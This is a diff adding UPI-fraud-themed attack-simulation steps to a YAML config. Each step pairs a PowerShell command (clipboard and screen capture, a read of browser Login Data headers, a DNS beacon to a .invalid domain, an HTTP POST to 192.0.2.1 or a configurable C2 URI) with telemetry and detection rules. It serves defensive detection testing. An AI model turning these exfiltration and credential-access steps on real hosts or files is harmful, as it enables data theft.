@@ -59,5 +59,168 @@ live_policy:
   spray_account_allowlist: []
   execution_window: ""   # optional "HH:MM-HH:MM" local-time gate
 
-# Telemetry steps (Portion 2) and lab steps (Portion 3) to follow.
-steps: []
+# Lab steps (Portion 3) to follow.
+steps:
+  - name: "Clipboard VPA Probe (UPI address variants + restoration)"
+    technique_id: T1115
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes three fake UPI VPA strings to clipboard, reads back, restores original clipboard content. No real payment data accessed."
+    reversible: true
+    telemetry:
+      - "Security EID 4688 (powershell.exe with clipboard Set/Get command line)"
+      - "PowerShell EID 4104 (script block: clipboard access) if ScriptBlock logging enabled"
+    detection:
+      - "UEBA: process writing UPI VPA patterns to clipboard — payment redirection precursor"
+      - "DLP: clipboard content matching VPA regex (@upi/@oksbi/@ybl)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      Add-Type -AssemblyName System.Windows.Forms
+      $original = [System.Windows.Forms.Clipboard]::GetText()
+      $vpas = @('bas-sim@upi','bas-payee@oksbi','bas-wallet@ybl')
+      $results = @()
+      foreach ($vpa in $vpas) {
+        [System.Windows.Forms.Clipboard]::SetText($vpa)
+        $read = [System.Windows.Forms.Clipboard]::GetText()
+        $results += ($read -eq $vpa)
+      }
+      if ($original) { [System.Windows.Forms.Clipboard]::SetText($original) } else { [System.Windows.Forms.Clipboard]::Clear() }
+      $restored = [System.Windows.Forms.Clipboard]::GetText() -eq $original
+      Write-Output "EXEC: clipboard VPA probe — wrote/read $($results.Count) VPA variants ($($vpas -join ', ')); clipboard restored=$restored. DLP rules targeting @upi/@oksbi/@ybl patterns should fire. [BAS-SIM]"
+    cleanup: ""
+
+  - name: "Screen Capture Probe (1x1 pixel, blank overwrite, cleanup verified)"
+    technique_id: T1113
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Captures a single 1x1 pixel from screen origin, saves to %TEMP%, overwrites with blank bitmap, deletes. Minimal privacy impact."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 (file create): bas_screen_<id>.bmp in %TEMP%"
+      - "Security EID 4688 (powershell.exe with Graphics.CopyFromScreen command line)"
+    detection:
+      - "EDR: PowerShell invoking screen-capture API — OTP harvesting precursor"
+      - "SIEM: file creation matching bas_screen_*.bmp pattern from powershell.exe"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      Add-Type -AssemblyName System.Drawing
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $file = Join-Path $env:TEMP "bas_screen_$runId.bmp"
+      $bmp = New-Object System.Drawing.Bitmap(1, 1)
+      $g   = [System.Drawing.Graphics]::FromImage($bmp)
+      $g.CopyFromScreen(0, 0, 0, 0, (New-Object System.Drawing.Size(1, 1)))
+      $bmp.Save($file)
+      $g.Dispose(); $bmp.Dispose()
+      $created = Test-Path $file
+      $blank = New-Object System.Drawing.Bitmap(1, 1)
+      $blank.Save($file)
+      $blank.Dispose()
+      Remove-Item $file -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $file)
+      Write-Output "EXEC: 1x1 screen capture (created=$created, blank-overwrite done, cleaned=$cleaned) — expect Sysmon EID 11. [BAS-SIM]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_screen_*.bmp') -Force -ErrorAction SilentlyContinue
+
+  - name: "Browser Login Data Accessibility Probe (header-only, read-only)"
+    technique_id: T1555.003
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Reads first 16 bytes (SQLite header magic) of browser Login Data DB only. No DB lock acquired. No credentials decrypted or read."
+    reversible: true
+    telemetry:
+      - "Security EID 4663 (file read access) on Chrome/Edge Login Data if SACL configured"
+      - "Security EID 4688 (powershell.exe with Login Data file access)"
+    detection:
+      - "EDR: non-browser process accessing Chrome/Edge Login Data file — credential theft precursor"
+      - "SIEM: file access to Login Data from powershell.exe (not chrome.exe/msedge.exe)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $dbs = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+      )
+      $found = @()
+      foreach ($db in $dbs) {
+        if (-not (Test-Path $db)) { continue }
+        try {
+          $fs = [System.IO.File]::Open($db, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+          $header = New-Object byte[] 16
+          $read = $fs.Read($header, 0, 16)
+          $fs.Close()
+          $isSQLite = ($read -ge 16) -and ([System.Text.Encoding]::ASCII.GetString($header[0..14]) -like 'SQLite format*')
+          $found += "$db (SQLite=$isSQLite)"
+        } catch { $found += "$db (locked or access denied)" }
+      }
+      if ($found.Count -gt 0) {
+        Write-Output "EXEC: browser Login Data probe — $($found -join '; '). Header read only, no credentials accessed. Expect EID 4663 on monitored paths. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: no Chrome/Edge Login Data databases found — browser credential store not present on this host."
+      }
+    cleanup: ""
+
+  - name: "DNS Exfil Beacon (UPI multi-tenant naming)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "nslookup to bas-upi-<tenant>-<runid>.invalid — RFC 2606 reserved, guaranteed NXDOMAIN. DNS query reaches corporate resolver only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22 (DNS query): bas-upi-<tenant>-<runid>.invalid"
+      - "Security EID 4688 (nslookup.exe with beacon domain)"
+      - "Corporate DNS log: NXDOMAIN response"
+    detection:
+      - "SIEM: DNS query for UPI-pattern subdomain from endpoint — deterministic fraud exfil beacon"
+      - "NDR: DNS query with upi/payment keyword from workstation"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $tenant = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').ToLower().Substring(0,[Math]::Min(8,($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').Length))
+      $beacon = "bas-upi-$tenant-$runId.invalid"
+      nslookup $beacon 2>&1 | Out-Null
+      Write-Output "EXEC: DNS exfil beacon '$beacon' queried — Sysmon EID 22 + nslookup EID 4688. NXDOMAIN expected. Use tenant='$tenant' + run-id='$runId' for multi-tenant SIEM correlation. [BAS-SIM]"
+    cleanup: ""
+
+  - name: "HTTP Exfil Probe (RFC5737 + versioned UPI payload)"
+    technique_id: T1071.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "HTTP POST to RFC5737 TEST-NET-1 (192.0.2.1) or BAS_C2_URI — no real internet egress. Deterministic bas-upi-v1 JSON schema payload."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3 (network connection): powershell.exe to 192.0.2.1 or BAS_C2_URI"
+      - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
+    detection:
+      - "EDR/SIEM: PowerShell HTTP POST with UPI/transaction payload — exfil signal"
+      - "DLP: outbound HTTP body containing vpa/txn_id/amount fields"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $uri   = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://192.0.2.1/bas-upi-exfil' }
+      $body  = '{"schema":"bas-upi-v1","run_id":"' + $runId + '","vpa":"bas-sim@upi","txn_id":"BAS-' + $runId + '","amount":"1.00"}'
+      try {
+        Invoke-WebRequest -Uri $uri -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 3 -ErrorAction Stop | Out-Null
+        Write-Output "EXEC: HTTP exfil POST to $uri succeeded — BAS listener responded. Schema: bas-upi-v1 run_id=$runId. [BAS-SIM]"
+      } catch {
+        Write-Output "EXEC: HTTP exfil POST to $uri attempted (timeout/refused — expected) — expect Sysmon EID 3 + EID 4688. Payload schema: bas-upi-v1 run_id=$runId vpa=bas-sim@upi. Set BAS_C2_URI for BAS listener. [BAS-SIM]"
+      }
+    cleanup: ""
